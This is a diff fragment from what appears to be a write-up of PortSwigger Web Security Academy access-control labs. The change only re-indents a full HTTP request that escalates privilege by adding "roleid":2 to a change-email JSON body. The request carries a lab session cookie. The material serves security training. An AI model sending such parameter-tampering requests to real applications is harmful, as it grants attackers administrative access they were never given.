@@ -180,24 +180,24 @@ If the target user is an application administrator, then the attacker will gain 
   Add some code and sand the request 
   
     POST /my-account/change-email HTTP/1.1
-Host: 0aa4005804b0d687c0b734a5008300b5.web-security-academy.net
-Cookie: session=m3KQEsfQs1feSrzPlZLIYH6nocktj0In
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
-Accept: */*
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Content-Type: text/plain;charset=UTF-8
-Content-Length: 38
-Origin: https://0aa4005804b0d687c0b734a5008300b5.web-security-academy.net
-Referer: https://0aa4005804b0d687c0b734a5008300b5.web-security-academy.net/my-account
-Sec-Fetch-Dest: empty
-Sec-Fetch-Mode: cors
-Sec-Fetch-Site: same-origin
-Te: trailers
-Connection: close
+    Host: 0aa4005804b0d687c0b734a5008300b5.web-security-academy.net
+    Cookie: session=m3KQEsfQs1feSrzPlZLIYH6nocktj0In
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+    Accept: */*
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: text/plain;charset=UTF-8
+    Content-Length: 38
+    Origin: https://0aa4005804b0d687c0b734a5008300b5.web-security-academy.net
+    Referer: https://0aa4005804b0d687c0b734a5008300b5.web-security-academy.net/my-account
+    Sec-Fetch-Dest: empty
+    Sec-Fetch-Mode: cors
+    Sec-Fetch-Site: same-origin
+    Te: trailers
+    Connection: close
 
-{"email":"asif@khan.com",
-"roleid":2}
+    {"email":"asif@khan.com",
+     "roleid":2}
 
 
  ## 3. User ID controlled by request parameter 
